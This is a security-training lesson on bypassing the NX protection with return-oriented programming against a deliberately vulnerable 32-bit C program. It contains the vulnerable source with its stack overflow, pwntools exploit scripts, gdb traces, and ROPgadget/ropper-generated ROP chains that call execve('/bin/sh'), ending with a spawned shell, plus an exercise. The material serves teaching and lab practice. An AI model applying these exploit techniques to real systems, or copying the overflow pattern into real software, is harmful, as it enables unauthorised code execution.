# Bypassing NX with Return Oriented Programming

Since it is assumed that all participants have the gone through the introductory
video on return oriented programming set out in the pre-requisites, we will jump
straight into developing our exploits. If you are not clear on the basics of
ROP, please revisit the video.

## Enabling NX

Let's start increasing protections on the binaries we play with. We can start
simple by only enabling the NX protection on the binaries we compile. For this
section we will take a look at the following binary compiled from the following
[source code][1].

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

void vuln() {
    char buffer[128];
    char * second_buffer;
    uint32_t length = 0;
    puts("Reading from STDIN");
    read(0, buffer, 1024);

    if (strcmp(buffer, "Cool Input") == 0) {
        puts("What a cool string.");
    }
    length = strlen(buffer);
    if (length == 42) {
        puts("LUE");
    }
    second_buffer = malloc(length);
    strncpy(second_buffer, buffer, length);
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    puts("This is a big vulnerable example!");
    printf("I can print many things: %x, %s, %d\n", 0xdeadbeef, "Test String",
            42);
    write(1, "Writing to STDOUT\n", 18);
    vuln();
}

```

Since the [binary][2] is not big enough to give us a decent number of ROP
gadgets, we will cheat a bit and compile the binary as a statically linked ELF.
This should include library code in the final executable and bulk up the size of
the binary. We also mark the writable regions of memory as non-executable.

```shell
gcc -m32 -fno-stack-protector -static -znoexecstack -o ./build/1_staticnx ./src/1_staticnx.c
```

We can verify that the binary has the NX protection enabled by using the
checksec script. We can also check that the file is statically compiled with
file.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/6_bypass_nx_rop/build$ checksec 1_staticnx
[*] '/vagrant/lessons/6_bypass_nx_rop/build/1_staticnx'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
ubuntu@ubuntu-xenial:/vagrant/lessons/6_bypass_nx_rop/build$ file 1_staticnx
1_staticnx: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=18a84fc7499b620b7453b9d37d7ba97dc356d7b2, not stripped
ubuntu@ubuntu-xenial:/vagrant/lessons/6_bypass_nx_rop/build$
```

## Obtaining EIP Control

First of all, we need to determine the offsets for EIP control. For the sake of
brevity, I will use the offset of 148 bytes. When you follow along in the
lesson, please do try obtaining the offset yourself. A rough skeleton [exploit
script][2] is given as follows:

```python
#!/usr/bin/python

from pwn import *

def main():
    # Start the process
    p = process("../build/1_staticnx")

    # Craft the payload
    payload = "A"*148 + p32(0xdeadc0de)
    payload = payload.ljust(1000, "\x00")

    # Print the process id
    raw_input(str(p.proc.pid))

    # Send the payload
    p.send(payload)

    # Transfer interaction to the user
    p.interactive()

if __name__ == '__main__':
    main()
```

Running the script and attach gdb to the process allows us to verify that the
EIP control works.

```shell
[----------------------------------registers-----------------------------------]
EAX: 0x80f15f8 ('A' <repeats 128 times>, "\370\025\017\b\230")
EBX: 0x80481b0 (<_init>:	push   ebx)
ECX: 0x10
EDX: 0x0
ESI: 0x80ee00c --> 0x8069c20 (<__strcpy_sse2>:	mov    edx,DWORD PTR [esp+0x4])
EDI: 0x3d ('=')
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd5f0 --> 0x0
EIP: 0xdeadc0de
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0xdeadc0de
[------------------------------------stack-------------------------------------]
0000| 0xffffd5f0 --> 0x0
0004| 0xffffd5f4 --> 0x0
0008| 0xffffd5f8 --> 0x0
0012| 0xffffd5fc --> 0x0
0016| 0xffffd600 --> 0x0
0020| 0xffffd604 --> 0x0
0024| 0xffffd608 --> 0x0
0028| 0xffffd60c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xdeadc0de in ?? ()
gdb-peda$
```

## Code Gadgets

Now, let's take a step back and think about how to proceed from this point. We
cannot use the previous strategy of placing shellcode on the stack and jumping
to it because the stack is now non-executable. One possible technique we can use
is to reuse existing code in the binary.

If you have gone through the pre-requisite watching, you may realise that these
snippets of useful code sequences that end in `ret` instructions are useful to
construct a ROP chain. Some of these sequences might look like the following:

```shell
0x0804f065 : pop esi ; pop ebp ; ret
```

These are called gadgets. We can automate searching for these gadgets using a
tool called `ROPgadget`.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/6_bypass_nx_rop/build$ ROPgadget --binary 1_staticnx
Gadgets information
============================================================
0x080add78 : aaa ; add esp, 4 ; pop ebx ; pop esi ; ret
0x080706c8 : aaa ; lea esp, dword ptr [ebp - 0xc] ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080bbca9 : aaa ; push 1 ; push 1 ; call eax
... snip ...
0x08091a7c : xor esi, esi ; ret 0xf01

Unique gadgets found: 12307
```

Now, some combination of a subset of these 12307 gadgets should surely yield us
a shell. Before we start mixing and matching, lets take an aside to discuss
Linux syscalls.

## Linux Syscalls

Linux system calls or syscalls are interfaces between the user space application
and the Linux kernel. Functionality performed by the Linux kernel can be invoked
by placing parameters into the right registers and passing control to the
interrupt vector 0x80 using the `int 0x80` opcode. Typically, this is not done
by the program directly but by calling glibc wrappers.

We will not go too deep into describing how the system calls work and go
straight to the system call that interests us the most: execve. The execve
system call runs an executable file within the context of the current process.

If we take a look at the libc function, we get the following signature:

`int execve(char const *path, char const *argv[], char const *envp[]);`

Typically, we invoke this function in the following manner to spawn shells.

`execve("/bin/sh", {0}, {0})`

If we take a look at the syscall reference located [here][6], we can see that
some parameters are expected in the eax, ebx, ecx, and edx registers.

1. eax - holds the number of the syscall to be called
2. ebx - a pointer to the string containing the file name to be executed
3. ecx - a pointer to the array of string pointers representing argv
4. edx - a pointer to the array of string pointers representing envp

For our purposes, the value that each of the registers should contain are:

```
eax = 0xb
ebx = "/bin/sh"
ecx = memory address -> 0
edx = memory address -> 0
```

## Generating the ROP Chain

Automatically finding the ROP gadgets to perform the `execve` syscall can be
done by ROPgadget. It actually even generates the the output as a python script
that you can embed into the skeleton.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/6_bypass_nx_rop/build$ ROPgadget --binary 1_staticnx --ropchain
... snip ...
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x8050fb5 mov dword ptr [esi], edi ; pop ebx ; pop esi ; pop edi ; ret
	[+] Gadget found: 0x8048453 pop esi ; ret
	[+] Gadget found: 0x80484a0 pop edi ; ret
	[-] Can't find the 'xor edi, edi' gadget. Try with another 'mov [r], r'

	[+] Gadget found: 0x805495b mov dword ptr [edx], eax ; ret
	[+] Gadget found: 0x807299a pop edx ; ret
	[+] Gadget found: 0x80bbb46 pop eax ; ret
	[+] Gadget found: 0x80493e3 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x80493e3 xor eax, eax ; ret
	[+] Gadget found: 0x807e1df inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481d1 pop ebx ; ret
	[+] Gadget found: 0x80e2fc9 pop ecx ; ret
	[+] Gadget found: 0x807299a pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8070605 int 0x80

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x0807299a) # pop edx ; ret
	p += pack('<I', 0x080ee060) # @ .data
	p += pack('<I', 0x080bbb46) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x0805495b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0807299a) # pop edx ; ret
	p += pack('<I', 0x080ee064) # @ .data + 4
	p += pack('<I', 0x080bbb46) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x0805495b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0807299a) # pop edx ; ret
	p += pack('<I', 0x080ee068) # @ .data + 8
	p += pack('<I', 0x080493e3) # xor eax, eax ; ret
	p += pack('<I', 0x0805495b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481d1) # pop ebx ; ret
	p += pack('<I', 0x080ee060) # @ .data
	p += pack('<I', 0x080e2fc9) # pop ecx ; ret
	p += pack('<I', 0x080ee068) # @ .data + 8
	p += pack('<I', 0x0807299a) # pop edx ; ret
	p += pack('<I', 0x080ee068) # @ .data + 8
	p += pack('<I', 0x080493e3) # xor eax, eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x0807e1df) # inc eax ; ret
	p += pack('<I', 0x08070605) # int 0x80
```

Integrating the generated code is as easy as copy and pasting into the [final
exploit][4].


```python
#!/usr/bin/python

from pwn import *

from struct import pack

# Padding goes here
rop = ''

rop += pack('<I', 0x0807299a) # pop edx ; ret
rop += pack('<I', 0x080ee060) # @ .data
rop += pack('<I', 0x080bbb46) # pop eax ; ret
rop += '/bin'
rop += pack('<I', 0x0805495b) # mov dword ptr [edx], eax ; ret
rop += pack('<I', 0x0807299a) # pop edx ; ret
rop += pack('<I', 0x080ee064) # @ .data + 4
rop += pack('<I', 0x080bbb46) # pop eax ; ret
rop += '//sh'
rop += pack('<I', 0x0805495b) # mov dword ptr [edx], eax ; ret
rop += pack('<I', 0x0807299a) # pop edx ; ret
rop += pack('<I', 0x080ee068) # @ .data + 8
rop += pack('<I', 0x080493e3) # xor eax, eax ; ret
rop += pack('<I', 0x0805495b) # mov dword ptr [edx], eax ; ret
rop += pack('<I', 0x080481d1) # pop ebx ; ret
rop += pack('<I', 0x080ee060) # @ .data
rop += pack('<I', 0x080e2fc9) # pop ecx ; ret
rop += pack('<I', 0x080ee068) # @ .data + 8
rop += pack('<I', 0x0807299a) # pop edx ; ret
rop += pack('<I', 0x080ee068) # @ .data + 8
rop += pack('<I', 0x080493e3) # xor eax, eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x0807e1df) # inc eax ; ret
rop += pack('<I', 0x08070605) # int 0x80

def main():
    # Start the process
    p = process("../build/1_staticnx")

    # Craft the payload
    payload = "A"*148 + rop
    payload = payload.ljust(1000, "\x00")

    # Send the payload
    p.send(payload)

    # Transfer interaction to the user
    p.interactive()

if __name__ == '__main__':
    main()
```

When we run the exploit, we get our shell.


```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/6_bypass_nx_rop/scripts$ python 2_ropexploit.py
[+] Starting local process '../build/1_staticnx': Done
[*] Switching to interactive mode
This is a big vulnerable example!
I can print many things: deadbeef, Test String, 42
Writing to STDOUT
Reading from STDIN
$ ls -la
total 16
drwxrwxr-x 1 ubuntu ubuntu 4096 Jan 12 20:31 .
drwxrwxr-x 1 ubuntu ubuntu 4096 Jan 13  2017 ..
-rw-rw-r-- 1 ubuntu ubuntu  422 Jan 12 06:03 1_skeleton.py
-rw-rw-r-- 1 ubuntu ubuntu 1897 Jan 12 20:31 2_ropexploit.py
$
[*] Stopped program '../build/1_staticnx'
ubuntu@ubuntu-xenial:/vagrant/lessons/6_bypass_nx_rop/scripts$
```

## Exercises

### 6.1 Using Ropper to Generate ROP Chains

There are alternative tools to ROPgadget that perform gadget searching and
automatic chain generation. One such tool is ropper. You can generate an execve
rop chain with the following command.

```shell
ubuntu@ubuntu-xenial:/vagrant/lessons/6_bypass_nx_rop/build$ ropper --file 1_staticnx --chain execve
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

[INFO] ROPchain Generator for syscall execve:


[INFO]
write command into data section
eax 0xb
ebx address to cmd
ecx address to null
edx address to null


[INFO] Try to create chain which fills registers without delete content of previous filled registers
[*] Try permuation 1 / 24
[INFO] Look for syscall gadget

[INFO] syscall gadget found
[INFO] generating rop chain
#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # 1_staticnx
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x00073b46) # 0x080bbb46: pop eax; ret;
rop += '//bi'
rop += rebase_0(0x0002a99a) # 0x0807299a: pop edx; ret;
rop += rebase_0(0x000a6060)
rop += rebase_0(0x0000c95b) # 0x0805495b: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x00073b46) # 0x080bbb46: pop eax; ret;
rop += 'n/sh'
rop += rebase_0(0x0002a99a) # 0x0807299a: pop edx; ret;
rop += rebase_0(0x000a6064)
rop += rebase_0(0x0000c95b) # 0x0805495b: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x000036ca) # 0x0804b6ca: pop dword ptr [ecx]; ret;
rop += p(0x00000000)
rop += rebase_0(0x00073b46) # 0x080bbb46: pop eax; ret;
rop += p(0x00000000)
rop += rebase_0(0x0002a99a) # 0x0807299a: pop edx; ret;
rop += rebase_0(0x000a6068)
rop += rebase_0(0x0000c95b) # 0x0805495b: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x000001d1) # 0x080481d1: pop ebx; ret;
rop += rebase_0(0x000a6060)
rop += rebase_0(0x0009afc9) # 0x080e2fc9: pop ecx; ret;
rop += rebase_0(0x000a6068)
rop += rebase_0(0x0002a99a) # 0x0807299a: pop edx; ret;
rop += rebase_0(0x000a6068)
rop += rebase_0(0x00073b46) # 0x080bbb46: pop eax; ret;
rop += p(0x0000000b)
rop += rebase_0(0x0002afa0) # 0x08072fa0: int 0x80; ret;
print rop
[INFO] rop chain generated!
```

However, using this payload in a [modified script][5] does not work. Can you
figure out why and fix it?

[1]: ./src/1_staticnx.c
[2]: ./build/1_staticnx
[3]: ./scripts/1_skeleton.py
[4]: ./scripts/2_ropexploit.py
[5]: ./scripts/3_brokenrop.py
[6]: http://syscalls.kernelgrok.com/

